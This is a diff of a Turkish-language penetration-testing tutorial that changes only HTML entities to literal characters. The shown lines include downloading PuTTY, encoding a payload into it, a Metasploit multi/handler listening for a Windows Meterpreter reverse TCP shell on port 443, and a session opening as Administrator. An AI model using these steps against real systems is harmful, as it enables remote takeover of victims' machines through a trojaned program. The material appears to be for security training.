@@ -51,7 +51,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 524288 **(**512K**)** **[**application/x-msdos-program]
 Saving to: `putty.exe'
 
-100%[=========================================================================================================&gt;] 524,288      815K/s   in 0.6s    
+100%[=========================================================================================================>] 524,288      815K/s   in 0.6s    
 
 2015-07-21 12:01:28 (815 KB/s) - `putty.exe' saved **[**524288/524288]
 
@@ -84,18 +84,18 @@ Found 1 compatible encoders Attempting to encode payload with 3 iterations of x8
 Bunun için ```exploit/multi/handler``` modülünü kullanalım ve gerekli ayarları yapalım.
 
 ```sh
-msf &gt; use exploit/multi/handler 
+msf > use exploit/multi/handler 
 
-msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp 
-PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
+PAYLOAD => windows/meterpreter/reverse_tcp
 
-msf exploit(handler) &gt; set LHOST 192.168.1.101
-LHOST =&gt; 192.168.1.101
+msf exploit(handler) > set LHOST 192.168.1.101
+LHOST => 192.168.1.101
 
-msf exploit(handler) &gt; set LPORT 443
-LPORT =&gt; 443
+msf exploit(handler) > set LPORT 443
+LPORT => 443
 
-msf exploit(handler) &gt; exploit
+msf exploit(handler) > exploit
 
 [*] Started reverse handler on 192.168.1.101:443 
 [*] Starting the payload handler...
@@ -108,11 +108,11 @@ Artık dinleme modülü de çalışmaktadır. Bu aşamadan sonra yapılması ger
 
 ```bash
 **[*********]** Sending stage **(**749056 bytes**)** to 192.168.1.201
-**[*********]** Meterpreter session 1 opened **(**192.168.1.101:443 -&gt; 192.168.1.201:1189**)** at Sat Feb 05 08:54:25 -0700 2011
+**[*********]** Meterpreter session 1 opened **(**192.168.1.101:443 -> 192.168.1.201:1189**)** at Sat Feb 05 08:54:25 -0700 2011
 
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: XEN-XP-SPLOIT\Administrator
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
